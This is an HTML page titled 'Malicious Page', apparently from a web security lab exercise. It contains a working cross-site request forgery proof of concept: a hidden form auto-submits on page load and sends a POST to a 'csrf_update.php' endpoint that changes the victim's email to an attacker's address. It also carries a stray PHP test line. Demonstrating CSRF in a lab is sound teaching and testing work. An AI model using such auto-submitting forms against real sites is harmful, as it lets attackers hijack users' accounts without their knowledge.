<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Malicious Page</title>
</head>

<!-- Auto-submit the form to simulate CSRF attack -->

<body onload="document.forms[0].submit()">
    <!-- Take the POST request and modify the email field and send it back to the server -->
    <form method="POST" action="/devinci-cracks/view/csrf_update.php" style="display:none;">
        <input type="email" name="email" value="attacker@example.com">
    </form>
    <?php echo "test" ?>
</body>

</html>